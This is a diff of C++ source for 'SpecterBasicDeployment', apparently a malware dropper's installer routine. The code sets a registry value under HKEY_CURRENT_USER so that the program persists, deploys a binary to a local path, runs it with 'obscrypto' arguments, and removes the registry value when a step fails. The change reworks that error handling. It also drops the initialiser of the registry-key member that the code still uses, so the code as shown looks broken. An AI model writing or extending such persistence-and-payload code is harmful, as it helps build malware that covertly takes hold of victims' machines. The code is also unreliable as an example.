@@ -1,5 +1,4 @@
 #include "SpecterBasicDeployment.hpp"
-#include "SpecterLib/SyscallException.h"
 #include "SpecterLib/CommonPaths.h"
 #include "SpecterLib/ResourceUtils.h"
 #include "SpecterLib/ProcessUtils.h"
@@ -12,7 +11,6 @@
 SpecterBasicDeployment::SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name, std::wstring obscrypto_args) :
 	m_program_name(std::move(program_name)),
 	m_target_file(CommonPaths::GetLocalPath() / target_file_name),
-	m_reg_key(HKEY_CURRENT_USER, kTargetRegistry),
 	m_obscrypto_args(std::move(obscrypto_args))
 {
 }
@@ -38,24 +36,21 @@ bool SpecterBasicDeployment::Install()
 {
 	try
 	{
-		if (!EnablePersistence())
+		if (EnablePersistence())
 		{
-			return false;
+			if (DeployBinary())
+			{
+				RunBinary();
+				return true;
+			}
 		}
-
-		if (!DeployBinary())
-		{
-			DisablePersistence();
-			return false;
-		}
-
-		RunBinary();
-		return true;
 	}
-	catch (const std::exception&)
+	catch (...)
 	{
-		return false;
 	}
+
+	DisablePersistence();
+	return false;
 }
 
 bool SpecterBasicDeployment::EnablePersistence()
@@ -85,12 +80,12 @@ bool SpecterBasicDeployment::DeployBinary() const
 	return true;
 }
 
-void SpecterBasicDeployment::DisablePersistence()
-{
-	m_reg_key.DeleteValue(m_program_name);
-}
-
 void SpecterBasicDeployment::RunBinary() const
 {
 	ProcessUtils::RunProcess(m_target_file, m_obscrypto_args);
+}
+
+void SpecterBasicDeployment::DisablePersistence()
+{
+	m_reg_key.DeleteValue(m_program_name);
 }
